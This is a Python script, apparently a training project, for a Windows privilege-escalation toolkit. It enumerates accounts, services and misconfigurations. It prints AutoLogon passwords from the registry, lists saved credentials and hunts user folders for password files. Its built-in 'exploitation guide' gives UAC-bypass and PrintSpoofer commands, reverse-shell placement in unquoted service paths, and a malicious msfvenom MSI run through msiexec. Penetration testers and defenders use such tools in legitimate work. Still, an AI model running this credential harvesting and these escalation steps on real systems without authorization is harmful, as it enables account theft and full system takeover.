#!/usr/bin/env python3
"""
win_privesc_toolkit.py — Windows Privilege Escalation Toolkit (Project #52)
Runs natively on Windows. Enumerates system info, misconfigurations,
credentials, and generates JSON + HTML reports.
"""
import os
import sys
import subprocess
import json
import re
import ctypes
from datetime import datetime
from pathlib import Path

REPORTS_DIR = "reports"
EXTRACTED_DIR = "extracted"

class Colors:
    GREEN  = ""
    RED    = ""
    YELLOW = ""
    BLUE   = ""
    RESET  = ""
    BOLD   = ""

def run_cmd(cmd, timeout=30):
    """Run a Windows command and return stdout."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, errors="ignore"
        )
        return result.stdout.strip(), result.stderr.strip()
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT"
    except Exception as e:
        return "", str(e)

def is_admin():
    """Check if running as Administrator."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

class WinPrivescToolkit:
    def __init__(self):
        os.makedirs(REPORTS_DIR, exist_ok=True)
        os.makedirs(EXTRACTED_DIR, exist_ok=True)
        self.report = {
            "hostname": os.environ.get("COMPUTERNAME", "unknown"),
            "username": os.environ.get("USERNAME", "unknown"),
            "is_admin": is_admin(),
            "timestamp": datetime.now().isoformat(),
            "phases": {}
        }

    # ------------------------------------------------------------------
    # PHASE 1 — System Enumeration
    # ------------------------------------------------------------------
    def phase1_system_enum(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 1] SYSTEM ENUMERATION{Colors.RESET}")
        results = {}

        # OS info
        out, _ = run_cmd("systeminfo")
        os_name = "Unknown"
        os_version = "Unknown"
        for line in out.split("\n"):
            if "OS Name:" in line:
                os_name = line.split(":", 1)[1].strip()
            elif "OS Version:" in line:
                os_version = line.split(":", 1)[1].strip()
        print(f"    OS: {os_name}")
        print(f"    Version: {os_version}")
        results["os_name"] = os_name
        results["os_version"] = os_version

        # Hotfixes
        out, _ = run_cmd("wmic qfe get HotFixID,InstalledOn /format:csv")
        hotfixes = [line.split(",")[1] for line in out.split("\n")
                    if line.startswith("KB") or ",KB" in line]
        hotfixes = [h for h in hotfixes if h.startswith("KB") or h.startswith("KB")]
        hotfix_count = len([l for l in out.split("\n") if "KB" in l])
        print(f"    Hotfixes installed: {hotfix_count}")
        results["hotfix_count"] = hotfix_count

        # Local users
        out, _ = run_cmd("net user")
        users = []
        capture = False
        for line in out.split("\n"):
            if "----" in line:
                capture = True
                continue
            if capture and line.strip() and not line.startswith("The command"):
                users.extend(line.split())
        users = [u for u in users if u and not u.startswith("-")]
        print(f"    Local users: {len(users)}")
        results["local_users"] = users

        # Administrators group
        out, _ = run_cmd("net localgroup administrators")
        admins = []
        capture = False
        for line in out.split("\n"):
            if "----" in line:
                capture = True
                continue
            if capture and line.strip() and "command completed" not in line.lower():
                admins.append(line.strip())
        print(f"    Administrators: {admins}")
        results["administrators"] = admins

        # Services
        out, _ = run_cmd("sc query state= all")
        service_count = out.count("SERVICE_NAME:")
        print(f"    Services: {service_count}")
        results["service_count"] = service_count

        self.report["phases"]["system_enum"] = results

    # ------------------------------------------------------------------
    # PHASE 2 — Misconfigurations
    # ------------------------------------------------------------------
    def phase2_misconfig(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 2] MISCONFIGURATIONS{Colors.RESET}")
        results = {}

        # Unquoted service paths
        print(f"\n  [UNQUOTED PATHS] Scanning service paths...")
        out, _ = run_cmd(
            'wmic service get name,displayname,pathname,startmode /format:csv'
        )
        unquoted = []
        for line in out.split("\n"):
            parts = line.split(",")
            if len(parts) >= 4:
                path = parts[2].strip() if parts[2] else ""
                name = parts[1].strip() if parts[1] else ""
                if path and " " in path and not path.startswith('"'):
                    if "system32" not in path.lower() and "windows" not in path.lower():
                        unquoted.append({"name": name, "path": path})
                        print(f"    {Colors.RED}[+] {name}: {path}{Colors.RESET}")
        print(f"    Found: {len(unquoted)} unquoted paths")
        results["unquoted_paths"] = unquoted

        # AlwaysInstallElevated
        print(f"\n  [ALWAYS INSTALL ELEVATED] Checking registry...")
        out1, _ = run_cmd(
            'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
        )
        out2, _ = run_cmd(
            'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
        )
        always_install = ("0x1" in out1 and "0x1" in out2)
        print(f"    AlwaysInstallElevated: {'ENABLED (vulnerable)' if always_install else 'disabled'}")
        results["always_install_elevated"] = always_install

        # AutoLogon credentials
        print(f"\n  [AUTOLOGON] Checking registry...")
        out, _ = run_cmd(
            'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"'
        )
        autologon = {}
        for line in out.split("\n"):
            if "DefaultUserName" in line or "DefaultPassword" in line:
                parts = line.split()
                if len(parts) >= 3:
                    key = parts[0]
                    value = " ".join(parts[2:])
                    autologon[key] = value
                    print(f"    {Colors.YELLOW}[+] {key} = {value}{Colors.RESET}")
        results["autologon"] = autologon

        # Saved credentials
        print(f"\n  [SAVED CREDENTIALS] Checking cmdkey...")
        out, _ = run_cmd("cmdkey /list")
        saved_creds = [l.strip() for l in out.split("\n") if "Target:" in l]
        print(f"    Saved credentials: {len(saved_creds)}")
        results["saved_credentials"] = saved_creds

        self.report["phases"]["misconfig"] = results

    # ------------------------------------------------------------------
    # PHASE 3 — Credential Discovery
    # ------------------------------------------------------------------
    def phase3_creds(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 3] CREDENTIAL DISCOVERY{Colors.RESET}")
        results = {"files_with_passwords": [], "registry_secrets": []}

        # Search for files with "password" in the name
        print(f"\n  [FILES] Searching for password files...")
        search_paths = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads"),
            "C:\\Temp",
        ]
        for base in search_paths:
            if not os.path.exists(base):
                continue
            for root, dirs, files in os.walk(base):
                for f in files:
                    if any(k in f.lower() for k in ["password", "passwd", "creds", "config"]):
                        full = os.path.join(root, f)
                        try:
                            size = os.path.getsize(full)
                            if size > 0 and size < 1024 * 100:
                                results["files_with_passwords"].append({
                                    "path": full,
                                    "size": size
                                })
                                print(f"    {Colors.RED}[+] {full} ({size} bytes){Colors.RESET}")
                        except Exception:
                            pass

        print(f"    Files found: {len(results['files_with_passwords'])}")

        self.report["phases"]["creds"] = results

    # ------------------------------------------------------------------
    # PHASE 4 — Exploitation Guide (Documented)
    # ------------------------------------------------------------------
    def phase4_exploitation_guide(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 4] EXPLOITATION GUIDE (documented){Colors.RESET}")
        print(f"    {Colors.YELLOW}These are documented exploits, not auto-fired.{Colors.RESET}")

        guide = {
            "uac_bypass": {
                "description": "Bypass UAC to elevate from standard user to admin",
                "tools": ["UACME (akagi64.exe)", "fodhelper.exe", "eventvwr.exe"],
                "prerequisite": "Standard user with admin group membership",
                "manual_steps": [
                    "Download UACME from github.com/hfiref0x/UACME",
                    "Run: akagi64.exe 23 C:\\Windows\\System32\\cmd.exe",
                ]
            },
            "token_impersonation": {
                "description": "Impersonate SYSTEM via SeImpersonatePrivilege",
                "tools": ["PrintSpoofer.exe", "JuicyPotato.exe", "RoguePotato.exe"],
                "prerequisite": "Service account with SeImpersonate enabled",
                "manual_steps": [
                    "Download PrintSpoofer64.exe",
                    "Run: PrintSpoofer64.exe -i -c cmd",
                ]
            },
            "unquoted_service_path": {
                "description": "Place malicious executable in unquoted service path",
                "tools": ["Manual (create exe in C:\\Program.exe)"],
                "prerequisite": "Service with unquoted path running as SYSTEM",
                "manual_steps": [
                    "Identify unquoted path from Phase 2",
                    "Place reverse-shell exe at the parse-break point",
                    "Restart the service",
                ]
            },
            "always_install_elevated": {
                "description": "Install MSI as SYSTEM",
                "tools": ["msiexec.exe"],
                "prerequisite": "AlwaysInstallElevated enabled in both HKLM and HKCU",
                "manual_steps": [
                    "Generate MSI with msfvenom",
                    "Run: msiexec /quiet /qn /i malicious.msi",
                ]
            },
        }

        for name, info in guide.items():
            print(f"\n    [{name.upper()}]")
            print(f"      {info['description']}")
            print(f"      Tools: {', '.join(info['tools'])}")

        self.report["phases"]["exploitation_guide"] = guide

    # ------------------------------------------------------------------
    # PHASE 5 — Report
    # ------------------------------------------------------------------
    def _collect_confirmed(self):
        confirmed = []
        mis = self.report["phases"].get("misconfig", {})
        if mis.get("unquoted_paths"):
            confirmed.append(f"misconfig.unquoted_paths ({len(mis['unquoted_paths'])})")
        if mis.get("always_install_elevated"):
            confirmed.append("misconfig.always_install_elevated")
        if mis.get("autologon"):
            confirmed.append("misconfig.autologon")
        if mis.get("saved_credentials"):
            confirmed.append(f"misconfig.saved_credentials ({len(mis['saved_credentials'])})")
        creds = self.report["phases"].get("creds", {})
        if creds.get("files_with_passwords"):
            confirmed.append(f"creds.files ({len(creds['files_with_passwords'])})")
        return confirmed

    def phase5_report(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 5] REPORT{Colors.RESET}")
        confirmed = self._collect_confirmed()
        print(f"\n    Total findings: {len(confirmed)}")
        for c in confirmed:
            print(f"      * {c}")

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_path = f"{REPORTS_DIR}/win_privesc_{ts}.json"
        with open(json_path, "w") as f:
            json.dump(self.report, f, indent=2, default=str)
        print(f"\n    [OK] JSON: {json_path}")

        html_path = f"{REPORTS_DIR}/win_privesc_{ts}.html"
        with open(html_path, "w") as f:
            f.write(self._build_html(confirmed))
        print(f"    [OK] HTML: {html_path}")

    def _build_html(self, confirmed):
        rows = ""
        for phase, data in self.report["phases"].items():
            rows += f"<h3>{phase}</h3><pre>{json.dumps(data, indent=2, default=str)[:3000]}</pre>"
        return f"""<!DOCTYPE html><html><head><title>Windows Privesc Report</title>
<style>
body {{ font-family: monospace; background:#111; color:#eee; padding:20px; }}
h1 {{ color:#ff5555; }} h3 {{ color:#55ff55; border-bottom:1px solid #333; }}
pre {{ background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }}
</style></head><body>
<h1>Windows Privilege Escalation Report</h1>
<p><b>Hostname:</b> {self.report['hostname']}</p>
<p><b>User:</b> {self.report['username']}</p>
<p><b>Admin:</b> {self.report['is_admin']}</p>
<p><b>Timestamp:</b> {self.report['timestamp']}</p>
<p><b>Findings:</b> {len(confirmed)}</p>
<ul>{''.join(f'<li>{c}</li>' for c in confirmed)}</ul>
{rows}
</body></html>"""

    def run_all(self):
        print("=" * 64)
        print("  Windows Privilege Escalation Toolkit - Project #52")
        print("=" * 64)
        print(f"[+] Hostname: {self.report['hostname']}")
        print(f"[+] User:     {self.report['username']}")
        print(f"[+] Admin:    {self.report['is_admin']}")
        self.phase1_system_enum()
        self.phase2_misconfig()
        self.phase3_creds()
        self.phase4_exploitation_guide()
        self.phase5_report()

if __name__ == "__main__":
    if not sys.platform.startswith("win"):
        print("ERROR: This toolkit must run on Windows.")
        sys.exit(1)
    WinPrivescToolkit().run_all()